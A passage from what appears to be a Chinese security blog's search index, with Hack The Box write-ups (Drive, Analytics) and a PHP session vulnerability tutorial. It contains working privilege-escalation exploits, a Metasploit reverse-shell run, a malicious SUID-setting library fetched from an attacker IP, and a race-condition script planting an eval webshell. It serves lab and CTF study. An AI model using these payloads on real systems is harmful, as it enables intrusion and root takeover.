&quot;/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'UPDATE accounts_customuser SET is_active=1 WHERE username=\\&quot;%s\\&quot;;'&quot;, v13, v6, v7, v13[0]); printf(&quot;Activating account for user '%s'...\\n&quot;, v13, v8, v9, v10, v11, v13[0]); system(v14);}else{ puts(&quot;Error: Username cannot be empty.&quot;);} 提权方法一(bof+printf)尝试利用二进制文件漏洞提权; 这道题我自己写了个exp，本地可以成功，我想去靶场机对外开一个端口服务，使我攻击机可以nc到靶场机运行这个有漏洞的二进制文件，但是我发现这个二进制文件没有刷新缓冲区原因等，导致这种办法用不了；我直接把我的exp放到靶机上，有缺少一些python的库；最终利用python的ssh技术得到远程机的一个进程提权成功 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(os='linux',arch='amd64',log_level='debug')filename = &quot;doodleGrive-cli&quot;#p = process(filename)elf = ELF(filename)ssh_host = 'drive.htb'ssh_user = 'tom'ssh_pass = 'johnmayer7'ssh_port = 22sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)p = sh.run('./doodleGrive-cli')pop_rax = 0x0000000000453e37pop_rdi = 0x0000000000401912pop_rsi = 0x000000000040f74epop_rdx = 0x000000000040181fret = 0x000000000040101asyscall = 0x00000000004012d3binsh = 0x497CD5#Canary ==&gt; %15$pp.sendlineafter(&quot;Enter Username:\\n&quot;,b&quot;%15$p&quot;)p.recvuntil('Enter password for ')Canary = int(p.recv(18),16)print(hex(Canary))payload = b&quot;a&quot;*0x38+p64(Canary)+b&quot;deadbeef&quot;+p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)p.sendlineafter(&quot;:\\n&quot;,payload)p.interactive() 方法二(load_extension)一开始我想尝试利用文件读取函数来得到/root/root.txt,遗憾的是我并没有搜索到sqllie3的文件读取函数的有关信息； 利用SQLite3中的load_extension函数。你可以在这里查看更多关于它的信息：SQLite3 load_extension。 经过广泛的测试后，我们注意到应用程序过滤掉了字符“ ”。和“/”，最大输入长度为40个字符。为了绕过第一个限制，我们可以使用char()函数将文本写成ASCII。对于第二个限制，我们需要将文件压缩到只有一个字符以节省空间 创建一个恶意文件a.c;记住，文件名应该只包含一个字符，初始化函数应该遵循以下格式：sqlite3_&lt;filename&gt;_init()(也就是filename要与load_extension函数中的文件名要一致才行)。 1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void sqlite3_a_init() {setuid(0);setgid(0);system(&quot;/usr/bin/chmod +s /bin/bash&quot;);} 编译代码 1gcc -shared a.c -o a.so -nostartfiles -fPIC 开启python服务 1python3 -m http.server 在靶机下载恶意文件并实时攻击得到root 123456789101112131415161718192021222324252627tom@drive:~$ wget 10.10.16.13:8000/a.sotom@drive:~$ mv a.so atom@drive:~$ ./doodleGrive-cli [!]Caution this tool still in the development phase...please report any issue to the development team[!]Enter Username:moriartyEnter password for moriarty:findMeIfY0uC@nMr.Holmz!Welcome...!doodleGrive cli beta-2.2: 1. Show users list and info2. Show groups list3. Check server health and status4. Show server requests log (last 1000 request)5. activate user account6. ExitSelect option: 5 Enter username to activate account: &quot;+load_extension(char(46,47,97))--+Activating account for user '&quot;+load_extension(char(46,47,97))--+'...tom@drive:~$ ls -l /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bashtom@drive:~$ bash -pbash-5.0# whoamiroot","link":"/2023/12/15/Drive(HTB)/"},{"title":"Analytics(HTB)","text":"信息搜集1234567891011sudo nmap -p- -min-rate 10000 10.10.11.233[sudo] kali 的密码：Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 13:44 CSTNmap scan report for analytical.htb (10.10.11.233)Host is up (0.12s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 7.20 seconds /etc/hosts 1210.10.11.233 analytical.htb10.10.11.233 data.analytical.htb user-metabase发现 Metabase 有一个最近披露的预身份验证 RCE 漏洞;CVE-2023-38646 该系统在0.46.6.1之前的开源版本和1.46.6.1之前的企业版本中存在漏洞。 /api/session/properties（无需授权也可访问）泄露setup-token； 我这里直接用msf； 12345678910111213141516171819202122232425262728293031323334┌──(kali㉿kali)-[~]└─$ msfconsolemsf6 &gt; search metabaseMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/metabase_setup_token_rce 2023-07-22 excellent Yes Metabase Setup Token RCEInteract with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce msf6 &gt; use 0[*] Using configured payload cmd/unix/reverse_bashmsf6 exploit(linux/http/metabase_setup_token_rce) &gt; set rhost http://data.analytical.htb/rhost =&gt; http://data.analytical.htb/msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set lhost 10.10.16.5lhost =&gt; 10.10.16.5msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set rport 80rport =&gt; 80msf6 exploit(linux/http/metabase_setup_token_rce) &gt; run[*] Started reverse TCP handler on 10.10.16.5:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target appears to be vulnerable. Version Detected: 0.46.6[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f[*] Sending exploit (may take a few seconds)[*] Command shell session 1 opened (10.10.16.5:4444 -&gt; 10.10.11.233:49520) at 2024-01-01 13:49:23 +0800 whoami metabase user-metalytics敏感信息藏得挺深的，居然在环境变量里面； 1234567891011121314151617181920212223242526272829env MB_LDAP_BIND_DN= LANGUAGE=en_US:en USER=metabase HOSTNAME=f119c1f252f8FC_LANG=en-USSHLVL=5LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libHOME=/home/metabaseMB_EMAIL_SMTP_PASSWORD=LC_CTYPE=en_US.UTF-8JAVA_VERSION=jdk-11.0.19+7LOGNAME=metabase_=/bin/shMB_DB_CONNECTION_URI=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_PASS=MB_JETTY_HOST=0.0.0.0META_PASS=An4lytics_ds20223#LANG=en_US.UTF-8MB_LDAP_PASSWORD=SHELL=/bin/shMB_EMAIL_SMTP_USERNAME=MB_DB_USER=META_USER=metalyticsLC_ALL=en_US.UTF-8JAVA_HOME=/opt/java/openjdkPWD=/MB_DB_FILE=//metabase.db/metabase.db 中发现 12META_USER=metalyticsMETA_PASS=An4lytics_ds20223# ssh登陆成功 12ssh metalytics@10.10.11.233 An4lytics_ds20223# user-rootsudo -l没有利用点123metalytics@analytics:~$ sudo -l[sudo] password for metalytics: Sorry, user metalytics may not run sudo on localhost. suid没有利用点123456789101112131415metalytics@analytics:~$ find / -perm -4000 2&gt;/dev/null/var/tmp/bash/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/su/usr/bin/umount/usr/bin/chsh/usr/bin/fusermount3/usr/bin/sudo/usr/bin/passwd/usr/bin/mount/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/libexec/polkit-agent-helper-1 uname -a1Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux 使用 CVE-2023-2640 和 CVE-2023-32629 获取非 Root 容器的 Root 权限，又名 GameOver(lay) payload只有一行 1unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)' Vulnerable kernels Kernel version Ubuntu release 6.2.0 Ubuntu 23.04 (Lunar Lobster) / Ubuntu 22.04 LTS (Jammy Jellyfish) 5.19.0 Ubuntu 22.10 (Kinetic Kudu) / Ubuntu 22.04 LTS (Jammy Jellyfish) 5.4.0 Ubuntu 22.04 LTS (Local Fossa) / Ubuntu 18.04 LTS (Bionic Beaver) 总结耐心，坚持，研究和技术技能的结合让我实现了目标。","link":"/2024/01/01/Analytics/"},{"title":"session相关漏洞","text":"session什么是session官方Session定义：在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。主要有以下特点： sessin保存的位置是在服务器端session通常是要配合cookie使用因为HTTP的无状态性，服务端产生了session来标识当前的用户状态 本质上，session就是一种可以维持服务器端的数据存储技术。即session技术就是一种基于后端有别于数据库的临时存储数据的技术 session.upload_progress我先从头到尾分析一下利用session.upload_progress进行文件包含 相关配置在讲该姿势的具体利用方法之前，要先讲几个 php.ini 中的相关配置，这也是利用该方式进行文件包含的前提，此特性自 PHP 5.4.0 后可用。 123456session.auto_start = offsession.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.save_path= &quot;/var/lib/php/sessions&quot; 1234567enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；prefix+name将表示为session中的键名 当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，例如 1234&lt;?php$key = ini_get(&quot;session.upload_progress.prefix&quot;) . ini_get(&quot;session.upload_progress.name&quot;);var_dump($_SESSION[$key]);?&gt; 存储机制当开启session时，服务器都会在一个临时目录下创建一个session文件来保存会话信息，文件名格式为 sess_PHPSESSID 。在linux系统中，session文件一般保存在以下几个目录：以session.save_path为依据 1234/var/lib/php//var/lib/php/sessions//tmp//tmp/sessions/ 分析问题一代码里没有session_start(),如何创建session文件呢。 其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。 但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=zixyd，PHP将会在服务器上创建一个文件：sess_zixyd。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_zixyd。 问题二但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空， 需要条件竞争 实验一在kali中开启nginx;并创建index.php文件内容如下: 1234567891011&lt;?phphighlight_file(__FILE__);session_start();if($_POST['zixyd']){ include $_POST['zixyd'];}phpinfo();?&gt; 使用了session_start函数，并且存在任意文件包含漏洞，但是服务器上却没有恶意的文件包含可以getwebshell时，这时可以利用session.upload_progress 方法一(bp)创建一个可以上传文件的html文件 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.6.98/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&lt;?php cat('cat /flag.txt');?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 随便上传一个文件并抓包发送到intruder模块，注意是随便上传一个文件,这里我们只需要利用在文件上传时PHP_SESSION_UPLOAD_PROGRESS和Cookie中PHPSESSID的值,而和上传什么文件无关，这个包是为了条件竞争制作恶意文件的 123456789101112131415161718192021222324252627POST /index.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: PHPSESSID=zixydAccept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------32681549875692968181236391716Content-Length: 4686Origin: nullConnection: closeUpgrade-Insecure-Requests: 1-----------------------------32681549875692968181236391716Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;§1§&lt;?php system('cat /flag.txt');?&gt;-----------------------------32681549875692968181236391716Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.md&quot;Content-Type: application/octet-stream```https://www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c32cb_ORWtGGSc0A92https://www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c33f5_FmQaeCt30A88``` 再抓一个包发送到intruder模块，这个包存在任意文件包含漏洞，是为了包含恶意文件的 123456789101112131415POST / HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 48Origin: http://192.168.6.98Connection: closeReferer: http://192.168.6.98/Cookie: PHPSESSID=rou5qd86se828i5on12sl79fp6Upgrade-Insecure-Requests: 1zixyd=%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_zixyd&amp;haha=§1§ 成功 方法二(python)12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- encoding:utf-8 -*-import ioimport threadingimport requestsurl = &quot;http://192.168.6.98/&quot;sessid = 'zixyd'def write(session): filebytes = io.BytesIO(b'a'*1024*50) while True: session.post(url=url,data = { 'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[2]);?&gt;' },cookies={ 'PHPSESSID':sessid },files={ 'file': ('zixyd.jpg',filebytes) })def read(session): while True: res1 = session.post(url=url, data={ 'zixyd': r&quot;/var/lib/php/sessions/sess_&quot;+ sessid, '2': r&quot;system('cat /flag.txt');&quot; }) if 'flag' in res1.text: print(res1.text.encode('gbk','ignore').decode('gbk')) # else: # print(&quot;retry~~~~&quot;)if __name__ == '__main__': with requests.session() as session: for i in range(20): threading.Thread(target=write,args=(session,)).start() for i in range(20): threading.Thread(target=read,args=(session,)).start() 输出如下：可以很明显的看到是由“upload_progress_”和“”为键值，|后面的就是session中存储的上传进度时的信息；只不过&lt;?php eval($_POST[2]);?&gt;已经被php解析了变成了flag{this is fuck flag}，这里也可以看出另一点：session.serialize_handler = php,这与session产生反序列漏洞有关 12upload_progress_flag{this is fuck flag}|a:5:{s:10:&quot;start_time&quot;;i:1704606442;s:14:&quot;content_length&quot;;i:51477;s:15:&quot;bytes_processed&quot;;i:5250;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:9:&quot;zixyd.jpg&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1704606442;s:15:&quot;bytes_processed&quot;;i:5250;}}} session_unserPHP session序列化机制根据php.ini中的配置项，我们研究将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎： 处理器 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列处理的数组 php处理器这里为了加深说明除了session_start函数，还可以用session.auto_start配置，我接下来的使用将不使用函数，而是更改配置;（这样改配置本来没有问题，但是这样改配置达不到看处理器不同而存储的序列化数据不同，听不懂？ 下面会说明） 我的实验环境是：kali+nginx+fpm 123456789101112131415┌──(kali㉿kali)-[~]└─$ sudo find / -name php.ini /var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/apache2/php.ini/var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/cli/php.ini/etc/php/8.2/apache2/php.ini/etc/php/8.2/cli/php.ini/etc/php/8.2/fpm/php.ini┌──(kali㉿kali)-[~]└─$ sudo vim /etc/php/8.2/fpm/php.ini修改： session.auto_start = 1重启fpm服务使得php.ini生效┌──(kali㉿kali)-[~]└─$ systemctl restart php8.2-fpm.service 测试代码 1234567&lt;?phphighlight_file(__FILE__);$_SESSION['name'] = $_GET['name'];echo $_SESSION['name'];?&gt; 这里可以看到，未使用session_start函数;Cookie却存在PHPSESSID 来看看php处理器将数据序列化的形式 1234567891011121314┌──(root㉿kali)-[/var/lib/php/sessions]└─# pwd /var/lib/php/sessions ┌──(root㉿kali)-[/var/lib/php/sessions]└─# ls -al总计 772drwx-wx-wt 2 root root 778240 1月 7日 14:25 .drwxr-xr-x 4 root root 4096 2023年 4月 5日 ..-rw------- 1 www-data www-data 17 1月 7日 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh ┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_bb95aoqqkmvq2ltbpcdlu16hvh name|s:5:&quot;zixyd&quot;; php_serialize处理器12345678910&lt;?phphighlight_file(__FILE__);ini_set('session.serialize_handler','php_serialize');$_SESSION['name'] = $_GET['name'];echo $_SESSION['name'];?&gt; 这里我已经将session.serialize_handler改成了php_serialize 但是数据函数以php处理器方式存储的；经过排查找到原因：ini_set('session.serialize_handler','php_serialize');只对当前文件的session_start函数有效；而对php.ini中的配置无效， 1234567891011┌──(root㉿kali)-[/var/lib/php/sessions]└─# ls -al总计 776drwx-wx-wt 2 root root 778240 1月 7日 14:40 .drwxr-xr-x 4 root root 4096 2023年 4月 5日 ..-rw------- 1 www-data www-data 17 1月 7日 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh-rw------- 1 www-data www-data 17 1月 7日 14:40 sess_mekil2i1boqaof0g4rohu4ef8p ┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_mekil2i1boqaof0g4rohu4ef8pname|s:5:&quot;zixyd&quot;; 所以我又将php.ini中的session.auto改回了0，并在文件中添加session_start(); 123┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_6bf6o57tcu6h8735crmc0845e1a:1:{s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;} 12php: name|s:5:&quot;zixyd&quot;; php_serialize: a:1:{s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;} session的反序列化漏洞利用session的反序列化漏洞，就是利用php处理器和php_serialize处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因 实验一创建一个test.php，使用php_serialize处理器； 123456789&lt;?phphighlight_file(__FILE__);ini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['zixyd'] = $_GET['zixyd'];echo $_SESSION['zixyd'];?&gt; 创建一个shell.php，默认使用php处理器 123456789101112131415&lt;?phphighlight_file(__FILE__); session_start();class shell{ public $name; function __wakeup(){ echo &quot;success&quot;; } function __destruct(){ eval($this-&gt;name); }}$test = new shell();?&gt; 123456789&lt;?phpclass shell{ public $name;}$a = new shell();$a-&gt;name = &quot;phpinfo();&quot;;echo serialize($a);?&gt;//O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;} 将|O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}url编码；访问test.php；将恶意数据存储到session文件中 1http://192.168.6.98/test.php?zixyd=%7CO%3A5%3A%22shell%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A10%3A%22phpinfo()%3B%22%3B%7D 123┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_6bf6o57tcu6h8735crmc0845e1a:1:{s:5:&quot;zixyd&quot;;s:46:&quot;|O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;} 可以看到恶意数据已经成功存储到了session文件，直接访问shell.php即可执行phpinfo php处理器会以|作为分隔符，将O:5:&quot;shell&quot;:1:{s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;}反序列化，就会触发__wakeup()方法，最后对象销毁执行__destruct()方法中的eval()函数 实验二创建一个test2.php文件内容如下： 12345678910111213141516171819202122232425&lt;?phpini_set('session.serialize_handler', 'php');session_start();class zixyd{ public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET['phpinfo'])){ $m = new zixyd();}else{ highlight_file(__FILE__);}?&gt; 查看phpinfo 1http://web.jarvisoj.com:32784/index.php?phpinfo=1 从phpinfo中寻找重要信息如下： Directive Local Value Master Value session.auto_start Off Off session.save_path /var/lib/php/sessions /var/lib/php/sessions session.serialize_handler php php_serialize session.upload_progress.enabled on on session.upload_progress.cleanup Off Off session.upload_progress.name PHP_SESSION_UPLOAD_PROGRESS PHP_SESSION_UPLOAD_PROGRESS session.upload_progress.prefix upload_progress_ upload_progress_ session.use_strict_mode Off Off 可见php.ini中session.serialize_handler = php_serialize，当前目录中被设置为session.serialize_handler = php，因此存在session反序列化利用的条件 12local value(局部变量：作用于当前目录程序，会覆盖master value内容):phpmaster value(主变量：php.ini里面的内容):php_serialize 那么我们如何找到代码入口将利用代码写入到session文件？想要写入session文件就得想办法在$_SESSION变量中增加我们可控的输入点，这里可以利用session.upload_progress,因为这样的话session.upload_progress.name 和filename的值都可控制； 123456789101112&lt;?phpclass zixyd{ public $mdzz;}$a = new zixyd();$a-&gt;mdzz = 'system(&quot;id&quot;);';echo serialize($a);?&gt; //O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;} 还是利用那个文件上传的html文件 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.6.98/test2.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 这里有个奇怪的点就是：我将session.upload_progress.cleanup 关了，但依然没有用，文件上传的信息依然没有，最终还是利用条件竞争 |O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}注意这里有一个|，这里可以把payload放到session.upload_progress.name 和filename都是可以的 123456789101112131415161718192021222324POST /test2.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------8126225181410704334410916334Content-Length: 361Origin: nullConnection: closeCookie: PHPSESSID=ir85hm42ah4mln0ko3svp355ciUpgrade-Insecure-Requests: 1-----------------------------8126225181410704334410916334Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;§1§|O:5:&quot;zixyd&quot;:1:{s:4:&quot;mdzz&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;}-----------------------------8126225181410704334410916334Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.md&quot;Content-Type: application/octet-stream1-----------------------------8126225181410704334410916334-- 123456789101112GET /test2.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=ir85hm42ah4mln0ko3svp355ciUpgrade-Insecure-Requests: 1haha=§1§ success 最后放一张流程图,虽然和我做的实验不一样，但是意思就是这个意思，参考：F4ke12138","link":"/2024/01/07/session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"},{"name":"Network","slug":"Network","link":"/tags/Network/"},{"name":"Ctfshow","slug":"Ctfshow","link":"/tags/Ctfshow/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"Warmup","slug":"Warmup","link":"/tags/Warmup/"},{"name":"HTB","slug":"HTB","link":"/tags/HTB/"}],"categories":[]}